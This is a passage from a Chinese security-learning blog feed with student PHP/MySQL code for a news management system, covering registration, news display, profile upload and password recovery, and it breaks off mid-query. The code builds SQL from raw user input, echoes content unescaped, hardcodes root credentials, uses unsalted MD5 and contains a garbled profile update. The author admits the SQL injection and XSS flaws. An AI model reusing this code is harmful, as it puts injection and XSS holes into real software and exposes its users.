class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">$str = escapeshellarg($id);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/24escapeshellarg.png" alt></p><blockquote><p><a href="https://uknowsec.cn/posts/notes/php内置过滤函数总结.html" target="_blank" rel="noopener">参考博文</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 本周写的新闻管理系统未对用户输入做出相应的判断，存在大量的漏洞，这篇文章特地总结了&lt;code&gt;php&lt;/code&gt;内置过滤函数。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="summary" scheme="http://yoursite.com/tags/summary/"/>
    
  </entry>
  
  <entry>
    <title>note25</title>
    <link href="http://yoursite.com/2019/08/17/note25/"/>
    <id>http://yoursite.com/2019/08/17/note25/</id>
    <published>2019-08-17T02:07:46.000Z</published>
    <updated>2019-08-17T08:41:16.515Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 修改新闻管理系统注册用户功能，添加没有勾选<code>免责协议</code>时要提示，必须勾选后才能注册成功，点击<code>免责协议</code>可以展示协议内容，继续修改点赞功能，展示新闻管理系统，介绍思路。</p><a id="more"></a><!--export--><h3 id="一、注册功能"><a href="#一、注册功能" class="headerlink" title="一、注册功能"></a>一、注册功能</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Require_once &apos;../basedir/header.php&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head &gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div style=&quot;width:100%;text-align:center&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;h1&gt;注册&lt;/h1&gt;</span><br><span class="line">        &lt;form action=&quot;logup.php&quot; method=&quot;post&quot; onsubmit=&quot;checkEmpty()&quot; onchange=&quot;checkSelect()&quot;&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;idName&quot; placeholder=&quot;用户名&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot; id=&quot;idPwd&quot; placeholder=&quot;密码&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwdagain&quot; id=&quot;idPwdAg&quot; placeholder=&quot;再次输入密码&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">            &lt;p&gt;&lt;a href=&quot;./agree.php&quot; target=&quot;_blank&quot;&gt;&lt;input type=&quot;checkbox&quot; name=&quot;agree&quot; id=&quot;idAgree&quot;&gt;已阅读并同意《免责声明》&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td align=&quot;right&quot;&gt;</span><br><span class="line">            &lt;a href=&quot;/login.php&quot;&gt;&lt;button  align=&quot;right&quot;&gt;用户登录&lt;/button&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    function checkEmpty()&#123;</span><br><span class="line">        var name = document.getElementById(&apos;idName&apos;).value;</span><br><span class="line">        var pwd = document.getElementById(&apos;idPwd&apos;).value;</span><br><span class="line">        var pwdAg = document.getElementById(&apos;idPwdAg&apos;).value;</span><br><span class="line">        var agree = document.getElementById(&apos;idAgree&apos;).checked;</span><br><span class="line">        if(!(name &amp;&amp; pwd &amp;&amp; pwdAg))&#123;</span><br><span class="line">            alert(&apos;所有输入框内容不能为空！&apos;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            if (pwd != pwdAg) &#123;</span><br><span class="line">                alert(&apos;两次输入密码不一致！请重新输入密码！&apos;);</span><br><span class="line">                return;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                if(!agree)&#123;</span><br><span class="line">                    alert(&quot;请阅读完免责协议并勾选同意！&quot;);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return agree;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Require_once &apos;../basedir/footer.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line">Require_once &quot;sql.php&quot;;</span><br><span class="line"></span><br><span class="line">$agree = $_POST[&apos;agree&apos;];</span><br><span class="line"></span><br><span class="line">$uname = base64_encode($_POST[&apos;name&apos;]);</span><br><span class="line"></span><br><span class="line">$upass = md5($_POST[&apos;passwd&apos;]);</span><br><span class="line"></span><br><span class="line">$passAgain = md5($_POST[&apos;passwdagain&apos;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ($uname &amp;&amp; $upass &amp;&amp; $passAgain) &#123;</span><br><span class="line">    $checkName = mysql_query(&quot;SELECT * FROM `tb_users` where `username` = &apos;$uname&apos;;&quot;);</span><br><span class="line"></span><br><span class="line">    while (@$row = mysql_fetch_array($checkName))//转成数组，且返回第一条数据,当不是一个对象时候退出</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        if ($uname == $row[&apos;username&apos;]) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;用户名已存在，请重新输入！&apos;);&lt;/script&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($upass==$passAgain &amp;&amp; $agree==&apos;on&apos;) &#123;</span><br><span class="line">        echo</span><br><span class="line">        $result = mysql_query(&quot;INSERT INTO `tb_users` (`username`, `password`) VALUES(&apos;$uname&apos;, &apos;$upass&apos;);&quot;);</span><br><span class="line">        if (mysql_affected_rows()) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;恭喜你注册成功！即将跳转到登录页面！&apos;); location.href=&apos;login.php&apos;&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="二、问题与总结"><a href="#二、问题与总结" class="headerlink" title="二、问题与总结"></a>二、问题与总结</h3><p><strong>程序设计问题</strong>：点赞功能实现思路：点击按钮触发事件，进入后台处理页面，对数据库里面的<code>type</code>进行修改，统计出<code>type</code>的总和即热度；访问量的统计，每次从数据库读信息把view加1然后保存到数据库里面。</p><p><strong>程序架构问题</strong>：层次不清，目录比较混乱。</p><p><strong>团队合作问题</strong>：合作之前关于变量取名，程序处理结构均未沟通好，导致一些程序写好后合并程序时还要做修改。</p><p><strong>漏洞问题</strong>：未对用户输入做相应的处理，存在<code>SQL</code>注入、<code>XSS</code>等漏洞。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 修改新闻管理系统注册用户功能，添加没有勾选&lt;code&gt;免责协议&lt;/code&gt;时要提示，必须勾选后才能注册成功，点击&lt;code&gt;免责协议&lt;/code&gt;可以展示协议内容，继续修改点赞功能，展示新闻管理系统，介绍思路。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
      <category term="新闻管理系统" scheme="http://yoursite.com/tags/%E6%96%B0%E9%97%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>note24</title>
    <link href="http://yoursite.com/2019/08/17/note24/"/>
    <id>http://yoursite.com/2019/08/17/note24/</id>
    <published>2019-08-17T02:07:39.000Z</published>
    <updated>2019-08-17T03:38:30.191Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 新闻管理系统新闻展示页面、个人信息、找回密码以及点赞功能编写。</p><a id="more"></a><!--export--><h3 id="一、新闻展示页面-show-news-php"><a href="#一、新闻展示页面-show-news-php" class="headerlink" title="一、新闻展示页面 show_news.php"></a>一、新闻展示页面 show_news.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        新闻展示界面</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $hot = 0;</span><br><span class="line">        $title = 0;</span><br><span class="line">        $author = 0;</span><br><span class="line">        $view = 0;</span><br><span class="line">        $time = 0;</span><br><span class="line">        $content = 0;</span><br><span class="line">        @$id= $_GET[&apos;id&apos;];</span><br><span class="line">        $hostname = &apos;127.0.0.1&apos;;</span><br><span class="line">        $username = &apos;root&apos;;</span><br><span class="line">        $passwd = &apos;root&apos;;</span><br><span class="line">        if($id)&#123;</span><br><span class="line">            @$con = mysql_connect(&apos;127.0.0.1&apos;, &apos;root&apos;,&apos;root&apos;) or die(mysql_error());</span><br><span class="line">            @mysql_select_db(&quot;lianxi&quot;) or die(mysql_error());</span><br><span class="line">            mysql_query(&quot;set names &apos;utf8&apos;&quot;) or die(mysql_error());</span><br><span class="line">            $sql = &quot;SELECT * FROM `tb_news` WHERE `id`=&apos;$id&apos;&quot;;</span><br><span class="line">            $result = mysql_query($sql) or die(mysql_error());</span><br><span class="line">            for($i=0; $i&lt;mysql_affected_rows(); $i++)&#123;</span><br><span class="line">                $arr = mysql_fetch_assoc($result);</span><br><span class="line">                if($arr[&apos;id&apos;] == $id)&#123;</span><br><span class="line">                    $hot=$arr[&apos;hot&apos;];</span><br><span class="line">                    $title = base64_decode($arr[&apos;title&apos;]);</span><br><span class="line">                    $author = base64_decode($arr[&apos;author&apos;]);</span><br><span class="line">                    $view = $arr[&apos;view&apos;];</span><br><span class="line">                    $time = $arr[&apos;add_time&apos;];</span><br><span class="line">                    $content = base64_decode($arr[&apos;contents&apos;]);</span><br><span class="line">                        break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;&lt;h1 align=&apos;center&apos;&gt;$title&lt;/h1&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;div style=&apos;float: left&apos;&gt;&lt;label&gt;作者： $author&lt;/label&gt;&lt;label&gt; &amp;nbsp  时间：$time&lt;/label&gt;&lt;/div&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;div style=&apos;float: right&apos;&gt;&lt;label&gt;热度： $hot&lt;/label&gt;   &lt;label&gt; / 浏览量：$view&lt;/label&gt;&lt;/div&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;p align=&apos;center&apos;&gt;$content&lt;/p&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;hr&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &lt;&lt;&lt;EOF</span><br><span class="line">            &lt;div align=&quot;center&quot;&gt;</span><br><span class="line">                &lt;form action=&quot;newAddnews.php&quot;, mathod=&quot;post&quot;&gt;</span><br><span class="line">                    &lt;textarea rows=&apos;10&apos; cols=&apos;100&apos; style=&quot;resize: none&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">                    &lt;br&gt;</span><br><span class="line">                    &lt;input type=&quot;submit&quot; name=&quot;suubmit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">EOF;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;h4 align=&apos;center&apos;&gt;评论&lt;/h4&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        if($id) &#123;</span><br><span class="line">            @$con = mysql_connect(&apos;127.0.0.1&apos;, &apos;root&apos;, &apos;root&apos;) or die(mysql_error());</span><br><span class="line">            @mysql_select_db(&quot;lianxi&quot;) or die(mysql_error());</span><br><span class="line">            mysql_query(&quot;set names &apos;utf8&apos;&quot;) or die(mysql_error());</span><br><span class="line">            $sql = &quot;SELECT * FROM `tb_discuss` WHERE `new_id`=&apos;$id&apos;&quot;;</span><br><span class="line">            $result = mysql_query($sql) or die(mysql_error());</span><br><span class="line">            for ($i = 0; $i &lt; mysql_affected_rows(); $i++) &#123;</span><br><span class="line">                $arr1 = mysql_fetch_assoc($result);</span><br><span class="line">                $discussUser = base64_decode($arr1[&apos;discuss_user&apos;]);</span><br><span class="line">                $time = $arr1[&apos;discuss_time&apos;];</span><br><span class="line">                $discussContent = $arr1[&quot;discuss_content&quot;];</span><br><span class="line">                echo &quot;&lt;hr style=\&quot;border:1px dashed #000; height:1px\&quot;&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;p align=&apos;center&apos;&gt;用户：$discussUser&quot; .     &quot;     时间：$time&lt;/p&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;p align=&apos;center&apos;&gt;$discussContent&lt;/p&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;hr style=\&quot;border:1px dashed #000; height:1px\&quot;&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            mysql_close($con);</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="二、个人信息"><a href="#二、个人信息" class="headerlink" title="二、个人信息"></a>二、个人信息</h3><h4 id="1-personal-information-php"><a href="#1-personal-information-php" class="headerlink" title="1. personal_information.php"></a>1. personal_information.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php Require_once &apos;../basedir/header.php&apos;; ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line">if(!isset($_SESSION[&apos;username&apos;]))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;请登录后查看！&apos;);location.href=&apos;login.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        个人资料</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;div style=&quot;margin: 0px 600px 0px 600px&quot;&gt;</span><br><span class="line">           &lt;form action=&quot;personal_informationhoutai.php&quot; method=&quot;post&quot; enctype= &quot;multipart/form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line">                    头像：&lt;input type=&quot;file&quot; name=&quot;addr&quot;/&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">                    邮箱：&lt;input type=&quot;email&quot; name=&quot;email&quot;/&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">                    性别：&lt;input type=&quot;radio&quot; name=&quot;sexnan&quot;/&gt;男</span><br><span class="line">                          &lt;input type=&quot;radio&quot; name=&quot;sexnv&quot;/&gt;女&lt;br&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">                &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;</span><br><span class="line">               &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">Require_once &apos;../basedir/footer.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="2-personal-information-backstage-php"><a href="#2-personal-information-backstage-php" class="headerlink" title="2. personal_information_backstage.php"></a>2. personal_information_backstage.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Require_once &quot;sql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">$sql = &quot;SELECT * FROM `tb_users` WHERE `username`=&apos;$username&apos;;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$row = mysql_query($sql);</span><br><span class="line"></span><br><span class="line">$row = mysql_fetch_assoc($row);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$path = $row[&apos;addr&apos;];</span><br><span class="line">//var_dump($path);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">//将文件从临时文件中转移到文件保存路径</span><br><span class="line">var_dump(move_uploaded_file($_FILES[&apos;addr&apos;][&apos;tmp_name&apos;], $path));</span><br><span class="line"></span><br><span class="line">$email=  $_POST[&apos;email&apos;];</span><br><span class="line"></span><br><span class="line">    if($_POST[&apos;sexmale&apos;])&#123;</span><br><span class="line">        $sex = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    if($_POST[&apos;sexfemale&apos;])&#123;</span><br><span class="line">        $sex = -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">var_dump($_SESSION[&apos;username&apos;]);</span><br><span class="line">//var_dump($sex);</span><br><span class="line">$yuju = &quot;UPDATE `tb_users` SET email=&apos;&#123;$email&#125;&apos;,sex=&apos;$sex&apos; WHERE `username` = &apos;$_SESSION[&apos;username&apos;]&apos;;&quot;;</span><br><span class="line">//echo $path;</span><br><span class="line">$row=  mysql_query(&quot;&#123;$path&#125;&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="三、找回密码"><a href="#三、找回密码" class="headerlink" title="三、找回密码"></a>三、找回密码</h3><h4 id="1-find-passwd-php"><a href="#1-find-passwd-php" class="headerlink" title="1.find_passwd.php"></a>1.find_passwd.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Require_once &apos;../basedir/header.php&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head &gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2 align=&quot;center&quot;&gt;找回密码&lt;/h2&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;!--text-align:center;--&gt;</span><br><span class="line">&lt;div style=&quot;text-align:center;&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;form action=&quot;findPasswdhoutai.php&quot; method=&quot;post&quot; onsubmit=&quot;checkpass()&quot; onchange=&quot;checkanswer()&quot;&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot; placeholder=&quot;输入要找回密码的用户名&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;问题：你的爱好是？&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;answer&quot; id=&quot;inanswer&quot; placeholder=&quot;答案&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot; id=&quot;passFirst&quot; placeholder=&quot;新密码&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;passwdagain&quot; id=&quot;passSecond&quot; placeholder=&quot;再次输入密码&quot; style=&quot;height: 20px;width: 200px&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">            &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td align=&quot;right&quot;&gt;</span><br><span class="line">        &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">Require_once &apos;../basedir/footer.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="2-find-passwd-backstage-php"><a href="#2-find-passwd-backstage-php" class="headerlink" title="2.find_passwd_backstage.php"></a>2.find_passwd_backstage.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">Require_once &quot;sql.php&quot;;</span><br><span class="line">//需要修改！</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line">$username = $_POST[&apos;name&apos;];</span><br><span class="line">var_dump($username);</span><br><span class="line">//    $username = &apos;root&apos;;</span><br><span class="line">//删除用户</span><br><span class="line">$sql = &quot;SELECT * FROM 